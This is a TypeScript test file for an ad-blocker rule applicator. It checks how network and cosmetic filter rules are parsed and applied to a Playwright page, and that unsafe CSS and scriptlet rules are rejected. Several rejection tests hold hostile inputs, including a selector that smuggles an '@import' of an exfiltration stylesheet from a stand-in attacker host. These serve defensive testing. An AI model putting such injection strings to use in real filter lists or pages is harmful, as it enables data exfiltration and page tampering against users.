import { describe, it, expect, vi } from 'vitest';
import {
    extractNetworkPattern,
    extractAdSelector,
    applyRule,
} from '../../src/validator/rule-applicator';
import type { Page } from 'playwright-core';

/**
 * Create a minimal Page mock that tracks calls to route, addStyleTag, and evaluate.
 */
function mockPage(): Page {
    return {
        route: vi.fn().mockResolvedValue(undefined),
        unroute: vi.fn().mockResolvedValue(undefined),
        addStyleTag: vi.fn().mockResolvedValue(undefined),
        evaluate: vi.fn().mockResolvedValue(undefined),
    } as unknown as Page;
}

// ── extractNetworkPattern ────────────────────────────────────────────────

describe('extractNetworkPattern', () => {
    it('extracts URL pattern from a basic network rule', () => {
        expect(extractNetworkPattern('||ads.example.com^')).toBe('ads.example.com');
    });

    it('strips $domain= modifier and extracts the pattern', () => {
        const result = extractNetworkPattern('||ads.example.com^$domain=foo.com');
        expect(result).toBe('ads.example.com');
    });

    it('extracts pattern from pipe-prefixed rule', () => {
        const result = extractNetworkPattern('|https://cdn.example.com/ads/*');
        expect(result).toBe('https://cdn.example.com/ads/*');
    });

    it('extracts pattern from exception network rule', () => {
        const result = extractNetworkPattern('@@||good-ads.example.com^');
        expect(result).toBe('good-ads.example.com');
    });

    it('returns null for cosmetic rule', () => {
        expect(extractNetworkPattern('example.com##.ad-banner')).toBeNull();
    });

    it('returns null for comment', () => {
        expect(extractNetworkPattern('! comment')).toBeNull();
    });

    it('returns null for empty string', () => {
        expect(extractNetworkPattern('')).toBeNull();
    });
});

// ── extractAdSelector ────────────────────────────────────────────────────

describe('extractAdSelector', () => {
    it('extracts selector from ## (hiding) rule', () => {
        expect(extractAdSelector('example.com##.ad-banner')).toBe('.ad-banner');
    });

    it('extracts selector from #@# (exception) rule', () => {
        expect(extractAdSelector('example.com#@#.ad-banner')).toBe('.ad-banner');
    });

    it('extracts selector from #?# (extended CSS) rule', () => {
        expect(extractAdSelector('example.com#?#.ad-banner:has(img)')).toBe('.ad-banner:has(img)');
    });

    it('extracts selector from #@?# (extended CSS exception) rule', () => {
        expect(extractAdSelector('example.com#@?#.override')).toBe('.override');
    });

    it('returns null for #%# (scriptlet) rule', () => {
        const rule = "example.com#%#//scriptlet('abort-on-property-read','ads')";
        expect(extractAdSelector(rule)).toBeNull();
    });

    it('returns null for network rule', () => {
        expect(extractAdSelector('||ads.example.com^')).toBeNull();
    });

    it('returns null for comment', () => {
        expect(extractAdSelector('! comment')).toBeNull();
    });

    it('returns null for empty string', () => {
        expect(extractAdSelector('')).toBeNull();
    });

    it('extracts selector from multi-domain cosmetic rule', () => {
        expect(extractAdSelector('sub.example.com,other.example.com##.ads')).toBe('.ads');
    });

    it('extracts only the selector from a #$# CSS injection rule', () => {
        const rule = 'example.com#$#.ad-slot { min-height: 0 !important; }';
        expect(extractAdSelector(rule)).toBe('.ad-slot');
    });

    it('returns null for a #$# scriptlet rule', () => {
        const rule = "example.com#$#//scriptlet('abort-on-property-read','ads')";
        expect(extractAdSelector(rule)).toBeNull();
    });
});

// ── applyRule ─────────────────────────────────────────────────────────────

describe('applyRule', () => {
    it('applies network rule via page.route', async () => {
        const page = mockPage();
        await applyRule(page, '||ads.example.com^');
        expect(page.route).toHaveBeenCalled();
    });

    it('uses a glob that can match a full HTTPS URL across protocol slashes', async () => {
        const page = mockPage();
        const rule = '||adserver.example/path/ads?*placement=top*$domain=publisher.example';

        await applyRule(page, rule);

        expect(page.route).toHaveBeenCalledWith(
            '**adserver.example/path/ads?*placement=top**',
            expect.any(Function),
        );
    });

    it('applies cosmetic rule via page.addStyleTag', async () => {
        const page = mockPage();
        await applyRule(page, 'example.com##.ad-banner');
        expect(page.addStyleTag).toHaveBeenCalled();
    });

    it('returns cleanup that removes the exact injected cosmetic style', async () => {
        const page = mockPage();
        const remove = vi.fn();
        const evaluate = vi.fn().mockImplementation(async (callback) => {
            callback({ remove });
        });
        vi.mocked(page.addStyleTag).mockResolvedValueOnce({ evaluate } as never);

        const result = await applyRule(page, 'example.com##.ad-banner');
        await result.cleanup?.();

        expect(evaluate).toHaveBeenCalledOnce();
        expect(remove).toHaveBeenCalledOnce();
    });

    it('rejects a cosmetic selector that can escape into another CSS ruleset', async () => {
        const page = mockPage();

        const result = await applyRule(page, 'example.com##.ad-slot { display: none; } .comments');

        expect(result.applied).toBe(false);
        expect(result.error).toContain('Unsafe cosmetic selector');
        expect(page.addStyleTag).not.toHaveBeenCalled();
    });

    it('rejects an at-rule smuggled through a plain cosmetic selector', async () => {
        const page = mockPage();
        const rule = 'example.com##@import url(https://attacker.invalid/exfil.css); .ad';

        const result = await applyRule(page, rule);

        expect(result.applied).toBe(false);
        expect(result.error).toContain('Unsafe cosmetic selector');
        expect(page.addStyleTag).not.toHaveBeenCalled();
    });

    it('rejects scriptlet application without evaluating raw text', async () => {
        const page = mockPage();
        const rule = "example.com#%#//scriptlet('abort-on-property-read','ads')";
        const result = await applyRule(page, rule);
        expect(result).toEqual({
            applied: false,
            error: 'Scriptlet validation is unsupported; raw scriptlet text was not evaluated.',
        });
        expect(page.evaluate).not.toHaveBeenCalled();
    });

    it('injects one canonical safe #$# layout rule without evaluating JavaScript', async () => {
        const page = mockPage();
        const body = '.ad-slot { height: 52px !important; min-height: 52px !important; }';

        const result = await applyRule(page, `example.com#$#${body}`);

        expect(page.addStyleTag).toHaveBeenCalledWith({ content: body });
        expect(result).toEqual({ applied: true });
        expect(page.evaluate).not.toHaveBeenCalled();
    });

    it.each([
        '.ad-slot,.sidebar { height: 52px !important; }',
        '.ad-slot { height: 52px !important; } .comments { display: none !important; }',
        '.ad-slot { height: 52px !important; background: transparent !important; }',
        '.ad-slot { height: calc(100vh - 1px) !important; }',
        '.ad-slot { display: none !important; }',
    ])('rejects unsafe #$# CSS without injecting it: %s', async (body) => {
        const page = mockPage();

        const result = await applyRule(page, `example.com#$#${body}`);

        expect(result.applied).toBe(false);
        expect(result.error).toContain('Unsafe CSS injection');
        expect(page.addStyleTag).not.toHaveBeenCalled();
        expect(page.evaluate).not.toHaveBeenCalled();
    });

    it('does not evaluate a #$# scriptlet rule', async () => {
        const page = mockPage();
        const rule = "example.com#$#//scriptlet('abort-on-property-read','ads')";

        const result = await applyRule(page, rule);

        expect(result.applied).toBe(false);
        expect(result.error).toContain('unsupported');
        expect(page.evaluate).not.toHaveBeenCalled();
        expect(page.addStyleTag).not.toHaveBeenCalled();
    });

    it('no-ops on comment rule', async () => {
        const page = mockPage();
        await applyRule(page, '! some comment');
        expect(page.route).not.toHaveBeenCalled();
        expect(page.addStyleTag).not.toHaveBeenCalled();
        expect(page.evaluate).not.toHaveBeenCalled();
    });

    it('no-ops on empty rule', async () => {
        const page = mockPage();
        await applyRule(page, '');
        expect(page.route).not.toHaveBeenCalled();
        expect(page.addStyleTag).not.toHaveBeenCalled();
        expect(page.evaluate).not.toHaveBeenCalled();
    });

    it('no-ops on exception network rule (log, no abort)', async () => {
        const page = mockPage();
        await applyRule(page, '@@||good-ads.example.com^');
        // Exception network rules: route is still registered to allow, not abort
        // Implementation should skip or log, not abort.
        // For MVP, exception rules are silently skipped (no route registration).
        expect(page.route).not.toHaveBeenCalled();
    });

    it('no-ops on exception cosmetic rule (log, no style)', async () => {
        const page = mockPage();
        await applyRule(page, 'example.com#@#.ok-ad');
        // Exception cosmetic: logged, no style injected
        expect(page.addStyleTag).not.toHaveBeenCalled();
    });
});
